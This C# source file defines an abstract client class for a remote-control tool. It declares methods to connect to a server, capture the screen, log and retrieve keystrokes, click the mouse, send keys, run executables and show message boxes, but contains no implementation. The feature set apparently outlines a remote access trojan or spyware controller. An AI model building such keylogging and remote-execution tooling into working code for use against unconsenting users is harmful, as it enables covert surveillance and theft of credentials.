using System;
using System.Collections.Generic;
using System.Text;
using System.Drawing;
using System.IO;

namespace ClientDll
{
  public abstract class AbstractClient
    {
      private string port;
      private StreamWriter requestStream;
      private StreamReader responseStream;
      protected bool disposed = false;
      protected bool connected = false;
     
      public AbstractClient(string port)
        {
            this.port = port;
        }

        protected string Port
        {
            get { return port; }
            set { port = value; }
        }

      public abstract bool ConnectToServer(string serverAddress);
      public abstract bool DisConnectServer();
      public abstract Image GetScreen();
      public abstract string SendMessage(object  message);
      public abstract void Dispose(bool disposing);
      public abstract bool StartKeylog();
      public abstract bool Stopkeylog();
      public abstract string Getkey();
      public abstract bool MouseClickLeft(int x, int y);
      public abstract bool MouseClickRight(int x, int y);
      public abstract bool RunExe(string exe);
      public abstract bool ShowMessageBox(string message);
      public abstract bool SendKey(string key);

      protected StreamReader ResponseStream
      {
          get { return responseStream; }
          set { responseStream = value; }
      }


      protected StreamWriter RequestStream
      {
          get { return requestStream; }
          set { requestStream = value; }
      }
    

  }
}
